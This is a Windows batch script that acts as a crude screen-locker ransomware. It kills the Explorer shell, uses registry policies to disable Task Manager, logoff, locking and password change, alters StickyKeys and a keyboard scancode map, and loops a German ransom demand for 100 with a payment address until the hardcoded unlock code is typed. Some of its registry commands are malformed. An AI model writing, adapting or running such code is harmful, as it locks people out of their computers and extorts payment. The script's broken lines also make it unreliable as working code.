@echo off
taskkill /f /im explorer.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
powershell -command "& { Set-ItemProperty -Path 'HKCU:\Control Panel\Accessibility\StickyKeys' -Name 'Flags' -Value 506 }"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLogoff /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" "Scancode Map"=hex:00,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00

:pay
cls
echo Dein Comuter wurde eingenommen! Du musst 100� bezahlen, um dein Computer zu entsperren!
echo Webadresse: www.zahlungspc.cm/bezahlen
echo Deine id: 6B78A
set /p code=Code eingeben:

if "%code%"=="12345" goto richtig
echo Der eingegebene Code ist falsch, versuche es nochmal!
timeout /t 2
goto pay

:richtig
echo Dein Computer wurde entsperrt.
start explorer
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f
powershell -command "& { Set-ItemProperty -Path 'HKCU:\Control Panel\Accessibility\StickyKeys' -Name 'Flags' -Value 510 }"
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLogoff /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" "InactivityTimeoutSecs"=dword:0000001e
timeout /t 3
exit
